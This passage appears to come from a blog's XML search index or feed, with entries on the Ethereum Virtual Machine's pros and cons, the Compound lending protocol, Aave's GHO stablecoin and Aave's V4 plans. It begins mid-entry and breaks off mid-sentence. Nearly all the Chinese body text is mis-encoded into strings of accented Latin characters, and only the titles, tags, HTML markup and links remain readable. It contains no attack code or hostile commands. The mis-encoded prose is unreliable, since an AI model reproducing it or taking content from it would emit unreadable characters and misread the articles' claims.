¸å¿ƒï¼Œå¼ºè°ƒäº†å…¶åœ¨å†³å®šä»¥å¤ªåŠåŒºå—é“¾ä¸­æ¯ä¸ªåŒºå—çš„çŠ¶æ€æ–¹é¢çš„åŸºç¡€ä½œç”¨ã€‚</p><p>EVMå°±æ˜¯ä¸€ä¸ªè¿è¡Œç¯å¢ƒï¼Œå°±å¦‚åŒJavaçš„è¿è¡Œç¯å¢ƒä¸€æ ·ï¼Œå«ä¹‰ï¼Œåˆ†ç±»éƒ½å·®ä¸å¤šï¼Œå®ƒåŒ…æ‹¬äº†å †æ ˆï¼Œå†…å­˜ï¼Œå­˜å‚¨ï¼ŒEVMå­—èŠ‚ç ï¼Œæœ‰ä¸€ç‚¹ç¼–ç¨‹åŸºç¡€çš„éƒ½çŸ¥é“å †æ ˆï¼Œè¿™ç§å…ˆè¿›åå‡ºçš„ç»“æ„ï¼Œåæ­£å°±æ˜¯ä¸€ä¸ªç±»ä¼¼äºJVMä¸€æ ·æœºå™¨ï¼Œå®ƒä¸»è¦å°±æ˜¯è¿è¡Œä¸€äº›æ“ä½œç¬¦opcode,çœŸæ­£çš„è¦ç†è§£ç†Ÿæ‚‰opcodeæ“ä½œç¬¦ï¼Œ144ä¸ªï¼Œ<a href="https://www.evm.codes/?fork=shanghai">ç‚¹å‡»å­¦ä¹ </a>,æ›´å¤šçš„è¯¦ç»†æŒ‡ä»¤å‚è€ƒ<a href="https://www.wtf.academy/docs/evm-opcodes-101/">WTF</a>ï¼Œæˆ‘å°±ä¸ä¸€ä¸€è®²äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¤§ç™½è¯ï¼š</p><h2 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h2><ul><li>è·¨åŒºå—é“¾æ”¯æŒï¼šEVM æ”¯æŒå­—èŠ‚ç å…¼å®¹çš„æ™ºèƒ½åˆçº¦çš„èƒ½åŠ›ä½¿å…¶èƒ½å¤Ÿè·¨å„ç§åŒºå—é“¾ã€‚ Polygon å’Œ Avalanche ç­‰å¤šä¸ªåŒºå—é“¾éƒ½åˆ©ç”¨äº†æ­¤åŠŸèƒ½ï¼Œä½¿å®ƒä»¬èƒ½å¤Ÿåˆ©ç”¨ EVM å¼ºå¤§çš„ç”Ÿæ€ç³»ç»Ÿã€‚</li><li>éš”ç¦»æ²™ç®±ç¯å¢ƒï¼šEVM åœ¨åŒä¸€è®¡ç®—æœºç½‘ç»œå†…å•ç‹¬æ“ä½œæ¯ä¸ªä»£ç æ®µï¼Œç¡®ä¿ä¸€ä¸ªåº”ç”¨ç¨‹åºçš„æ‰§è¡Œä¸ä¼šå½±å“åŒºå—é“¾çš„å…¶ä½™éƒ¨åˆ†æˆ–èŠ‚ç‚¹è®¡ç®—æœºä¸Šå­˜å‚¨çš„æ•°æ®ã€‚è¿™ç§éš”ç¦»æœ‰åˆ©äºå¿«é€Ÿé«˜æ•ˆçš„å¼€å‘ã€‚</li><li>çµæ´»çš„å¼€å‘èƒ½åŠ›ï¼šEVM æ“…é•¿æ‰§è¡Œå¤æ‚ä¸”å®šåˆ¶çš„æ™ºèƒ½åˆçº¦ï¼Œè¿™å¯¹äºåŒ…æ‹¬ dAppã€ DeFiå¹³å°ã€æ¸¸æˆå’ŒNFTåœ¨å†…çš„å„ç§åº”ç”¨ç¨‹åºè‡³å…³é‡è¦ã€‚æ­¤å¤–ï¼ŒEVM å‘¨å›´æœ‰ä¸€ä¸ªåºå¤§çš„å¼€å‘äººå‘˜ç¤¾åŒºï¼Œç®€åŒ–äº†è½¯ä»¶æ„å»ºè¿‡ç¨‹ã€‚</li><li>è·¨æ“ä½œç³»ç»Ÿçš„äº¤å‰å…¼å®¹æ€§ï¼šç”±äºåŒºå—é“¾ç½‘ç»œä¸­ MacOSã€Windows ç­‰æ“ä½œç³»ç»Ÿçš„å¤šæ ·æ€§ï¼Œå¼€å‘å…¼å®¹è½¯ä»¶å¯èƒ½å…·æœ‰æŒ‘æˆ˜æ€§ã€‚ EVM é€šè¿‡æ ‡å‡†åŒ–å¹¶æ”¯æŒè·¨å¤šä¸ªæ“ä½œç³»ç»Ÿæ‰§è¡Œç¨‹åºæ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè€Œæ— éœ€å•ç‹¬çš„ä»£ç åº“ã€‚</li></ul><h2 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h2><ul><li>é«˜äº¤æ˜“æˆæœ¬ï¼ˆGas è´¹ï¼‰ ï¼šä½¿ç”¨ EVM æœ€æ˜¾ç€çš„ç¼ºç‚¹ä¹‹ä¸€æ˜¯åŠ å¯† Gasè´¹æˆæœ¬é«˜æ˜‚ã€‚ç”±äº EVM çš„å¯æ‰©å±•æ€§é™åˆ¶ï¼Œè¿™äº›è´¹ç”¨å¯èƒ½ä¼šè¿…é€Ÿå¢åŠ ï¼Œå°¤å…¶æ˜¯åœ¨ç½‘ç»œæµé‡è¾ƒé«˜çš„æ—¶æœŸã€‚</li><li>å¯æ‰©å±•æ€§æŒ‘æˆ˜ï¼šEVM æ¯ç§’åªèƒ½å¤„ç†æœ‰é™æ•°é‡çš„äº‹åŠ¡ã€‚è¿™ç§é™åˆ¶å¯èƒ½ä¼šå¯¼è‡´ç½‘ç»œæ‹¥å¡åŠ å‰§ï¼Œè¿›ä¸€æ­¥æ¨é«˜æ±½æ²¹è´¹ã€‚<br>éƒ¨ç½²æ™ºèƒ½åˆçº¦çš„æˆæœ¬ï¼šä»¥å¤ªåŠçš„æµè¡Œæ€§è´¨æ„å‘³ç€éƒ¨ç½²è‡ªå®šä¹‰æ™ºèƒ½åˆçº¦æˆ–æ›´å¤§çš„åº”ç”¨ç¨‹åºå¯èƒ½ä¼šæˆæœ¬é«˜æ˜‚ã€‚å¼€å‘äººå‘˜å¿…é¡»ä¼˜åŒ–å…¶åˆçº¦ä»¥æé«˜æ•ˆç‡ï¼Œæ¶ˆé™¤å†—ä½™ä»£ç æˆ–ä¸å¿…è¦çš„åŠŸèƒ½ï¼Œå¹¶ä¸”è¿˜å¿…é¡»è€ƒè™‘ä»¥å¤ªåŠåŒºå—é“¾ä¸Šçš„é«˜å­˜å‚¨æˆæœ¬ã€‚</li><li>æ™ºèƒ½åˆçº¦çš„ä¸å¯é€†æ€§ï¼šä¸€æ—¦éƒ¨ç½²ï¼ŒåŒºå—é“¾ä¸Šçš„æ™ºèƒ½åˆçº¦å°±æ— æ³•æ›´æ”¹ã€‚å¦‚æœåœ¨éƒ¨ç½²åå‘ç°é”™è¯¯æˆ–æ¼æ´ï¼Œåˆ™è¿™ç§ä¸å˜æ€§ä¼šå¸¦æ¥æŒ‘æˆ˜ï¼Œéœ€è¦é‡æ–°éƒ¨ç½²æ•´ä¸ªåˆçº¦ï¼Œè¿™å¯èƒ½ä¼šäº§ç”Ÿé¢å¤–çš„æˆæœ¬ã€‚</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> EVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Compound</title>
      <link href="/2024/08/19/Compound/"/>
      <url>/2024/08/19/Compound/</url>
      
        <content type="html"><![CDATA[<h1 id="Compound"><a href="#Compound" class="headerlink" title="Compound"></a>Compound</h1><p>Compoundæ˜¯åœ¨Ethereumä¸Šè¿è¡Œçš„è½¯ä»¶ï¼Œæ—¨åœ¨å¥–åŠ±åˆ†å¸ƒå¼è®¡ç®—æœºç½‘ç»œè¿è¡Œä¼ ç»Ÿè´§å¸å¸‚åœºã€‚Compoundå…è®¸ç”¨æˆ·å°†åŠ å¯†è´§å¸å­˜å…¥å€Ÿè´·æ± è®©å€Ÿæ¬¾äººä½¿ç”¨ã€‚è€Œè´·æ–¹ä»ä»–ä»¬å­˜å…¥çš„èµ„äº§èµšå–åˆ©æ¯ã€‚ </p><p>å­˜æ¬¾åï¼ŒCompoundä¼šå¥–åŠ±è´·æ–¹åä¸ºcTokenï¼ˆä»£è¡¨å­˜æ¬¾ï¼‰çš„æ–°åŠ å¯†è´§å¸ã€‚cTokençš„ä¾‹å­åŒ…æ‹¬cETHã€cBATä»¥åŠcDAIã€‚</p><p>æ¯ä¸ªcTokenéƒ½å¯æ— é™è½¬è®©æˆ–äº¤æ˜“ï¼Œä½†åªèƒ½å…‘æ¢æœ€åˆé”å®šåœ¨åè®®ä¸­çš„åŠ å¯†è´§å¸ã€‚æ•´ä¸ªè¿‡ç¨‹ç”±Compoundä»£ç è‡ªåŠ¨å¤„ç†ï¼Œä»£è¡¨è´·æ–¹å¯ä»¥éšæ—¶æå¸ã€‚</p><p>ä¸ºäº†æ¿€åŠ±è¿™ä¸ªè¡Œä¸ºï¼ŒCompoundä½¿ç”¨äº†å¦ä¸€ç§ç§°ä¸ºCOMPçš„è‡ªå®¶åŠ å¯†è´§å¸ã€‚æ¯å½“ç”¨æˆ·å’ŒCompoundå¸‚åœºäº’åŠ¨æ—¶ï¼ˆå€Ÿå…¥ã€æå–æˆ–å¿è¿˜èµ„äº§ï¼‰ï¼Œä½œä¸ºå¥–åŠ±ä»–ä»¬éƒ½ä¼šè·å¾—é¢å¤–çš„COMPä»£å¸ã€‚</p><p>ç®€è¨€ä¹‹ï¼ŒCompound æ˜¯ä¸€ä¸ªå…è®¸ç”¨æˆ·å€Ÿè´·ä»£å¸çš„æ™ºèƒ½åˆçº¦ï¼Œå®ƒä¸ä½ çš„é“¶è¡Œç±»ä¼¼ï¼ŒCompound æŠŠä½ çš„é’±å€Ÿç»™å€Ÿæ¬¾äººï¼Œå¹¶éšç€æ—¶é—´çš„æ¨ç§»èµšå–åˆ©æ¯ã€‚ä½†ä¸é“¶è¡Œä¸åŒçš„æ˜¯ï¼Œä½ çš„åˆ©æ¯æ˜¯ä»ä½ å­˜å…¥ Compound çš„æ™ºèƒ½åˆçº¦åå¼€å§‹å¤åˆ©è®¡ç®—çš„ã€‚å› ä¸ºè¿™æ˜¯ä¸€ä¸ªæ™ºèƒ½åˆçº¦ï¼Œæ•´ä¸ªæµç¨‹ä¸­æ²¡æœ‰ä¸­é—´äººï¼Œå› æ­¤åˆ©æ¯ä¼šæ¯”ä¼ ç»Ÿé“¶è¡Œè¦é«˜ã€‚</p><h2 id="è¿ä½œæœºåˆ¶"><a href="#è¿ä½œæœºåˆ¶" class="headerlink" title="è¿ä½œæœºåˆ¶"></a>è¿ä½œæœºåˆ¶</h2><p>Compound åè®®è®©å¼€å‘è€…å¯ä»¥åŸºäºä»¥å¤ªåŠå»ºç«‹å„ç§å„æ ·çš„è´§å¸å¸‚åœºï¼ˆmoney marketï¼‰ã€‚<br>æ‰€è°“çš„ã€Œè´§å¸å¸‚åœºã€ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªä¸ªçš„ç‹¬ç«‹å¸æ± å•å…ƒï¼Œæ¯ä¸ªå¸æ± é‡Œåªæœ‰ä¸€ç§ä»£å¸ï¼Œåè®®é€šè¿‡ç®—æ³•æ¥å†³å®šè¿™ä¸ªæ± å­é‡Œçš„å¸å€Ÿè´·çš„åˆ©ç‡æ˜¯å¤šå°‘ã€‚ç®€å•ç‚¹è¯´ï¼Œè¿™ä¸ªç®—æ³•ä¼šåŸºäºäººä»¬å¯¹è¿™ä¸ªå¸å€Ÿè´·çš„ä¾›éœ€å…³ç³»è‡ªåŠ¨è®¡ç®—å‡ºåˆ©ç‡ã€‚</p><p>ä¸ç®¡ä½ æ˜¯æ¥è´·æ¬¾è¿˜æ˜¯æ”¾è´·ï¼Œä½ éƒ½æ˜¯åœ¨è·Ÿ Compound åè®®ç›´æ¥æ‰“äº¤é“ã€‚è¿™ä¸€ç‚¹è·Ÿé‚£äº›ç‚¹å¯¹ç‚¹çš„å€Ÿè´·åè®®ä¸å¤ªä¸€æ ·ã€‚åœ¨ç‚¹å¯¹ç‚¹çš„æ–¹æ¡ˆé‡Œï¼Œå€Ÿè´·åŒæ–¹ä¼šåšåŒ¹é…ï¼Œç„¶åä½ éœ€è¦è·Ÿæ‰¾ä½ å€Ÿé’±çš„äººï¼ˆæˆ–è€…å€Ÿä½ é’±çš„äººï¼‰è¿›è¡Œæ²Ÿé€šï¼ŒåŒæ–¹è‡ªå·±å•†å®šå¥½å€Ÿæ¬¾çš„åˆ©ç‡ã€åˆ°æœŸæ—¶é—´å’ŒæŠµæŠ¼ç‰©å“ç­‰ç­‰ã€‚</p><p>è€Œåœ¨ Compound åè®®é‡Œï¼Œæ¯ä¸ªä»£å¸ï¼ˆæ¯”å¦‚ Etherã€Daiã€USDCï¼‰éƒ½æœ‰ä¸€ä¸ªå±äºè‡ªå·±çš„å€Ÿè´·å¸‚åœºï¼Œé‡Œé¢åŒ…å«æ¯ä¸ªç”¨æˆ·åœ¨è¿™ä¸ªå¸‚åœºé‡Œçš„ä½™é¢ï¼Œä»¥åŠå„ç¬”ç”Ÿæ•ˆçš„å€Ÿè´·äº¤æ˜“ï¼Œä¹ƒè‡³æ¯æ®µæ—¶æœŸçš„å†å²åˆ©ç‡ï¼Œç­‰ç­‰ã€‚</p><p>ç”¨æˆ·å¯ä»¥é€šè¿‡æŠµæŠ¼å“çš„ä¿¡è´·é¢åº¦æ— ç¼åœ°ä»åè®®ä¸Šå€Ÿé’±ï¼Œä½ åªéœ€è¦çœ‹è‡ªå·±è¦å€Ÿå“ªä¸ªå¸ï¼Œä¸éœ€è¦å’Œåˆ«äººæ²Ÿé€šè¿˜æ¬¾æ—¥æœŸã€åˆ©ç‡ï¼Œå°±èƒ½é©¬ä¸Šå€Ÿé’±ã€‚å€Ÿæ¬¾æ˜¯å®æ—¶ä¸”å¯é¢„æµ‹çš„ã€‚æ¯ä¸ªè´§å¸å¸‚åœºéƒ½æœ‰ä¸€ä¸ªç”±å¸‚åœºå†³å®šçš„æµ®åŠ¨åˆ©ç‡ã€‚</p><h2 id="æ¸…ç®—ä¿è¯"><a href="#æ¸…ç®—ä¿è¯" class="headerlink" title="æ¸…ç®—ä¿è¯"></a>æ¸…ç®—ä¿è¯</h2><p>Compound åè®®å¼ºåˆ¶åº”ç”¨äº†ä¸€æ¡è§„åˆ™ï¼Œå³æ¯ä¸ªè´¦æˆ·å¿…é¡»æ‹¥æœ‰è¶³å¤Ÿçš„ä½™é¢èƒ½å¤Ÿå¿è¿˜å€Ÿæ¬¾çš„é¢åº¦ï¼Œå«åš<strong>æŠµæŠ¼ç‡</strong>ã€‚æ¯ä¸ªè´¦æˆ·æ— æ³•åšå‡ºä»»ä½•ä¼šä½¿ã€Œä½™é¢ï¼å€Ÿæ¬¾é¢åº¦ã€ä½äºã€ŒæŠµæŠ¼ç‡ã€çš„è¡Œä¸ºã€‚æ¯”å¦‚å†å€Ÿæ›´å¤šçš„é’±æˆ–è€…æŠŠæŠµæŠ¼æ¬¾çš„ä½™é¢æç°ã€‚è¦å¢å¤§æˆ–è€…é‡ç½®æŠµæŠ¼ç‡ï¼Œç”¨æˆ·å¯ä»¥å…¨é¢æˆ–è€…éƒ¨åˆ†å¿è¿˜å€Ÿæ¬¾ã€‚ä»»ä½•è¢« Compound æŒæœ‰çš„ä½™é¢ï¼ŒåŒ…æ‹¬ç”¨æˆ·ç”¨æ¥åšæŠµæŠ¼å“çš„ä½™é¢ï¼ŒåŒæ—¶ä¹Ÿä¼šäº§ç”Ÿæ­£å¸¸çš„åº”è®¡åˆ©æ¯ã€‚</p><p>å¦‚æœä¸€ä¸ªç”¨æˆ·æä¾›çš„æŠµæŠ¼èµ„äº§ï¼Œé™¤ä»¥ä»–ä»¬ä¿¡ç”¨é¢åº¦æ‰€å€Ÿçš„æ¬¾é¡¹ï¼Œä½äºæŠµæŠ¼ç‡ï¼Œé‚£ä»–ä»¬çš„æŠµæŠ¼èµ„äº§å°±ä¼šï¼ˆé€šè¿‡å€Ÿæ¬¾èµ„äº§ï¼‰è¢«å‡ºå”®ï¼Œå‡ºå”®çš„ä»·æ ¼æ˜¯å½“å‰å¸‚åœºä»·æ ¼å‡å»æ¸…ç®—æŠ˜æ‰£ï¼ˆliquidation discountï¼‰ã€‚è¿™ä¸ªæœºåˆ¶ä¼šæ¿€åŠ±ç³»ç»Ÿé‡Œçš„å¥—åˆ©è€…ï¼Œå»å¿«é€Ÿå‡å°‘å€Ÿæ¬¾äººè¿˜ä¸äº†çš„å€Ÿæ¬¾èµ„äº§çš„çŸ­ç¼ºï¼Œä»è€Œé™ä½åè®®çš„é£é™©ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> åŸºç¡€çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GHO</title>
      <link href="/2024/08/19/GHO/"/>
      <url>/2024/08/19/GHO/</url>
      
        <content type="html"><![CDATA[<h1 id="GHO"><a href="#GHO" class="headerlink" title="GHO"></a>GHO</h1><p>å®ƒæ˜¯ Aave åè®®ä¸­å”¯ä¸€ä¸€ä¸ªå»ä¸­å¿ƒåŒ–ã€è¶…é¢æŠµæŠ¼çš„ç¨³å®šå¸ï¼Œä½œä¸ºä»¥å¤ªåŠä¸»ç½‘ä¸Šçš„å»ä¸­å¿ƒåŒ–ç¨³å®šå¸ï¼ŒGHO ç”±ç”¨æˆ·é“¸é€ ã€‚ä¸ Aave åè®®ä¸Šçš„æ‰€æœ‰å€Ÿè´·ä¸€æ ·ï¼Œç”¨æˆ·å¿…é¡»æä¾›æŠµæŠ¼å“ï¼ˆæŒ‰ç‰¹å®šæŠµæŠ¼å“æ¯”ç‡ï¼‰æ‰èƒ½é“¸é€  GHOã€‚ç›¸åº”åœ°ï¼Œå½“ç”¨æˆ·å¿è¿˜å€Ÿè´·å¤´å¯¸ï¼ˆæˆ–è¢«æ¸…ç®—ï¼‰æ—¶ï¼ŒGHO å°†è¿”å› Aave æ± å¹¶è¢«é”€æ¯ã€‚GHO é“¸é€ è€…ç´¯ç§¯çš„æ‰€æœ‰åˆ©æ¯æ”¯ä»˜å°†ç›´æ¥è¿›å…¥Aave DAO é‡‘åº“ï¼Œè¿™ä¸ç”¨æˆ·å€Ÿå…¥å…¶ä»–èµ„äº§æ—¶æ”¶é›†çš„æ ‡å‡†å‡†å¤‡é‡‘å› å­å½¢æˆé²œæ˜å¯¹æ¯”ï¼Œæœ¬é‡‘å°†è¢«é”€æ¯ã€‚</p><p>äººä»¬å¯¹çœŸæ­£å»ä¸­å¿ƒåŒ–ã€è¶…é¢æŠµæŠ¼å’Œå¯é…ç½®çš„ç¨³å®šå¸çš„éœ€æ±‚å¾ˆå¤§ã€‚æœ€è¿‘çš„äº‹ä»¶è¯æ˜äº†å»ä¸­å¿ƒåŒ–ç¨³å®šå¸åœ¨å¸‚åœºæ³¢åŠ¨æœŸé—´ç»´æŒç¨³å®šä»·å€¼çš„ç”¨ä¾‹ã€‚GHO æ˜¯ä¸€ç§ç”± Aave Governance æ§åˆ¶çš„ç¨³å®šå¸ï¼Œåœ¨ç¤¾åŒºæ”¯æŒä¸‹ï¼Œå®ƒæœ‰æ½œåŠ›æˆä¸º DeFi ç”Ÿæ€ç³»ç»ŸæŒç»­å¢é•¿ä¸å¯æˆ–ç¼ºçš„ä¸€éƒ¨åˆ†ã€‚</p><p>ä¸è®¸å¤šç¨³å®šå¸ä¸åŒï¼ŒGHO çš„é¢„è¨€æœºä»·æ ¼æ˜¯å›ºå®šçš„ã€‚GHO ç­‰å»ä¸­å¿ƒåŒ–ç¨³å®šå¸æ˜¯é€æ˜çš„ï¼Œæ— æ³•æ›´æ”¹ã€‚åˆ©ç‡ç”± Aave DAO å®šä¹‰ï¼Œå¿è¿˜çš„åˆ©æ¯å°†é‡å®šå‘åˆ° DAO è€Œä¸æ˜¯èµ„äº§ä¾›åº”å•†ã€‚åœ¨å®‰å…¨æ¨¡å—ä¸­è´¨æŠ¼ AAVE çš„å€Ÿæ¬¾äººå¯äº«å—æŠ˜æ‰£ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Aaveå­¦ä¹ çŸ¥è¯†</title>
      <link href="/2024/08/19/Aave%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/"/>
      <url>/2024/08/19/Aave%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Aave"><a href="#Aave" class="headerlink" title="Aave"></a>Aave</h1><h2 id="Aave-1"><a href="#Aave-1" class="headerlink" title="Aave"></a>Aave</h2><p>æ˜¯ä¸€ç§å®Œå…¨å»ä¸­å¿ƒåŒ–çš„ã€ç¤¾åŒºç®¡ç†çš„åè®®ï¼ŒAave æ˜¯èŠ¬å…°è¯­ï¼Œæ„æ€æ˜¯â€œå¹½çµâ€ï¼Œæœ€åˆäº 2017 å¹´ 11 æœˆæ¨å‡ºæ—¶è¢«ç§°ä¸º ETHLendã€‚ ETHLend æ˜¯ä¸€ä¸ªç‚¹å¯¹å¯¹ç‚¹å€Ÿè´·ç³»ç»Ÿã€‚åæ¥è¿›è¡Œæ”¹è¿›æ‰æ˜¯Aaveï¼Œç”¨æˆ·å¯ä»¥åœ¨å…¶ä¸­å€Ÿå…¥å’Œå€Ÿå‡ºåŠ å¯†èµ„äº§ã€‚åè®®çš„ä»·å€¼ä¸»å¼ æ˜¯åˆ›å»ºä¸€ä¸ªå¯ä¾›ä»»ä½•æ‹¥æœ‰åŠ å¯†èµ„äº§çš„äººä½¿ç”¨çš„æ›¿ä»£å»ä¸­å¿ƒåŒ–èµ„äº§è´§å¸å¸‚åœºã€‚</p><h2 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h2><p>Aave æ˜¯ä¸€ä¸ªå€Ÿè´·æ± ç³»ç»Ÿï¼Œä½¿ç”¨æˆ·å¯ä»¥é€‰æ‹©å€Ÿå…¥ã€å€Ÿå‡ºå’Œèµšå– 20 ç§ä¸åŒæ•°å­—èµ„äº§çš„åˆ©æ¯ï¼Œè€Œæ— éœ€ä¸­é—´äººã€‚</p><p>æƒ³è¦èµšå–åˆ©æ¯çš„ç”¨æˆ·å°†å­˜å…¥ä»–ä»¬æƒ³è¦å€Ÿå‡ºçš„èµ„é‡‘ï¼Œç„¶åå°†å…¶æ”¶é›†åˆ°æµåŠ¨æ€§æ± ä¸­ã€‚å½“å€Ÿæ¬¾äººè´·æ¬¾æ—¶ï¼Œä»–ä»¬ä»è¿™äº›èµ„é‡‘æ± ä¸­æå–èµ„é‡‘ã€‚è´·æ–¹å¯ä»¥ä»¥ä»»ä½•ä»–ä»¬è®¤ä¸ºåˆé€‚çš„æ–¹å¼äº¤æ˜“æˆ–è½¬è®©è¿™äº›ä»£å¸ã€‚</p><p>Aave å‘è¡Œä¸¤ç§ç±»å‹çš„ä»£å¸æ¥ä¿ƒè¿›æ­¤æ´»åŠ¨ï¼Œ$AAVEï¼ˆåŸç”Ÿä»£å¸ï¼‰å’Œ aTokensã€‚<br>$AAVE ä»¤ç‰Œæœ‰å¤šç§ä½¿ç”¨æ–¹å¼ï¼š<br>1ï¼Œå¦‚æœæ”¯ä»˜è´¹ç”¨ï¼Œ$AAVE çš„æ‰€æœ‰è€…å¯ä»¥é€‰æ‹©åœ¨å‘å…¬ä¼—å‘å¸ƒè´·æ¬¾ä¹‹å‰æŸ¥çœ‹è´·æ¬¾ã€‚</p><p>2ï¼Œ ä½¿ç”¨ $AAVE ä½œä¸ºæŠµæŠ¼å“çš„ç”¨æˆ·å¯ä»¥æ¯”ä½¿ç”¨ä»»ä½•å…¶ä»–æ•°å­—èµ„äº§å€Ÿå…¥çš„é‡‘é¢ç•¥å¤šã€‚</p><p>3ï¼Œä»£å¸æŒæœ‰è€…å¯ä»¥åœ¨å¹³å°ä¸Šè´¨æŠ¼ $AAVEï¼Œä»¥è·å¾—å¤§çº¦ 6% çš„ APY åˆ†é…ã€‚</p><p>aTokens ä»£å¸ï¼š</p><p>1ï¼Œè¿™äº›ä»£å¸åœ¨å­˜æ¬¾æ—¶é“¸é€ ï¼Œèµå›æ—¶é”€æ¯ã€‚</p><p>2ï¼Œå®ƒä»¬ä¸å­˜å…¥ Aave åè®®çš„åŸºç¡€èµ„äº§çš„ä»·å€¼ä»¥ 1:1 çš„æ¯”ç‡æŒ‚é’©ã€‚</p><p>3ï¼ŒaTokens ä¸ºè´·æ–¹æä¾›â€œæ”¶æ®â€ï¼Œå…è®¸ä»–ä»¬æ”¶å–å­˜æ¬¾åˆ©æ¯ã€‚</p><h2 id="v4"><a href="#v4" class="headerlink" title="v4"></a>v4</h2><p>ä»Šå¹´ï¼ˆ2024ï¼‰5æœˆï¼ŒAvara å…¬å¸ƒ Aave V4 ç‰ˆæœ¬çš„å‡çº§è®¡åˆ’ï¼Œé‡ç‚¹æ”¾åœ¨è¿›ä¸€æ­¥æå‡ Aave çš„æµåŠ¨æ€§ä¸èµ„äº§åˆ©ç”¨ç‡ã€‚Aave V4 ç‰ˆæœ¬å¼•å…¥äº†æµåŠ¨æ€§æº¢ä»·åŠŸèƒ½ï¼Œè¿™æ˜¯ä¸€ä¸ªæ ¹æ®æŠµæŠ¼å“é£é™©çŠ¶å†µè°ƒæ•´å€Ÿæ¬¾åˆ©ç‡ã€‚ä¸ºæ¯ç§èµ„äº§åˆ†é…é£é™©å› å­ï¼Œä¾æ®å¸‚åœºå’Œå¤–éƒ¨é£é™©å› ç´ åŠ¨æ€è°ƒæ•´ã€‚é£é™©è¾ƒä½çš„èµ„äº§ï¼ˆå¦‚ä»¥å¤ªåŠï¼‰ï¼Œå°†äº«å—æ›´ä½çš„å€Ÿè´·åˆ©ç‡ï¼Œè€Œé£é™©è¾ƒé«˜çš„èµ„äº§ï¼ˆå¦‚å±±å¯¨å¸ï¼‰åˆ™ç›¸å¯¹æé«˜å€Ÿè´·æˆæœ¬ã€‚</p><p>Aave V4 ç‰ˆæœ¬é€šè¿‡å¼•å…¥ä¸€ç³»åˆ—åˆ›æ–°åŠŸèƒ½ï¼Œä¼˜åŒ–äº†å€Ÿè´·ç›¸å…³çš„å®‰å…¨æ€§ä¸ç”¨æˆ·ä½“éªŒå¹¶ç®€åŒ–äº†æ²»ç†æµç¨‹ï¼š</p><ul><li><p>æ™ºèƒ½è´¦æˆ·å’Œé‡‘åº“çš„è®¾è®¡å¤§å¹…æå‡äº†ç”¨æˆ·ä½“éªŒï¼Œæ™ºèƒ½è´¦æˆ·å…è®¸ç”¨æˆ·é€šè¿‡å•ä¸€é’±åŒ…ç®¡ç†å¤šä¸ªä»“ä½ã€‚è€Œæ™ºèƒ½è´¦æˆ·å®ç°çš„é‡‘åº“åŠŸèƒ½å…è®¸ç”¨æˆ·ä¸ç›´æ¥å‘æµåŠ¨æ€§å±‚æä¾›æŠµæŠ¼å“çš„æƒ…å†µä¸‹å€Ÿæ¬¾ï¼ŒæŠµæŠ¼å“å°†åœ¨å€Ÿæ¬¾æ´»è·ƒæˆ–æ¸…ç®—äº‹ä»¶å‘ç”Ÿæ—¶è¢«é”å®šï¼Œå¢åŠ äº†ç”¨æˆ·äº¤äº’çš„ä¾¿æ·æ€§å’Œå®‰å…¨æ€§ã€‚</p></li><li><p>V4 ç‰ˆæœ¬è¿˜æå‡ºäº†åŠ¨æ€é£é™©é…ç½®ï¼Œä»¥åœ¨å¸‚åœºæ¡ä»¶å˜åŒ–æ—¶è°ƒæ•´é£é™©å‚æ•°ã€‚ç”¨æˆ·åœ¨å€Ÿæ¬¾æ—¶ä¼šä¸èµ„äº§çš„å½“å‰é…ç½®å…³è”ï¼Œè€Œæ–°çš„èµ„äº§é…ç½®åˆ™ä¸ºæ–°ç”¨æˆ·æä¾›ï¼Œé¿å…äº†å½±å“ç°æœ‰å€Ÿæ¬¾äººã€‚æ­¤å¤– V4 å¼•å…¥äº†è‡ªåŠ¨é€€å¸‚æœºåˆ¶ï¼Œç®€åŒ–äº†èµ„äº§ä¸‹æ¶è¿‡ç¨‹ã€‚</p></li></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ¯”é“¶è¡Œæ›´é«˜çº§çš„é“¶è¡Œï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªpool,åœ¨è¿™é‡Œå¯ä»¥è¿›è¡Œå­˜æ¬¾ä¸å€Ÿæ¬¾ï¼Œæ–¹ä¾¿ï¼Œä¿¡ä»»åº¦é«˜,ä½œä¸ºå»ä¸­å¿ƒåŒ–é‡‘èï¼ˆDeFiï¼‰å€Ÿè´·é¢†åŸŸçš„é¢†å¤´ç¾Šï¼ŒAave åœ¨èµ„äº§åˆ©ç”¨ç‡ã€å¸‚åœºå æœ‰ç‡å’Œäº¤æ˜“é‡æ–¹é¢å‡æ˜¾è‘—é¢†å…ˆäºç«äº‰å¯¹æ‰‹ï¼Œæ‰®æ¼”ç€å…³é”®è§’è‰²ã€‚ç„¶è€Œï¼ŒAave çš„é¢†å…ˆåœ°ä½å¹¶éä¸å¯åŠ¨æ‘‡ã€‚åè®®å¦‚ Radiant å’Œ Compound å·²å±•ç¤ºå‡ºå¼ºåŠ²çš„å¢é•¿æ½œåŠ›ï¼Œå¹¶æ¨å‡ºäº†å…·æœ‰å¢é•¿æ½œåŠ›çš„æ–°ç‰ˆæœ¬ã€‚ä¸ºäº†å·©å›ºå…¶å¸‚åœºåœ°ä½ï¼ŒAave å¯ä»¥é‡‡å–ä»¥ä¸‹ç­–ç•¥ï¼šåŠ å¼ºå…¶æ ¸å¿ƒå€Ÿè´·ä¸šåŠ¡ï¼Œæ¨åŠ¨ GHO çš„è¿›ä¸€æ­¥å‘å±•å¹¶äº Aave 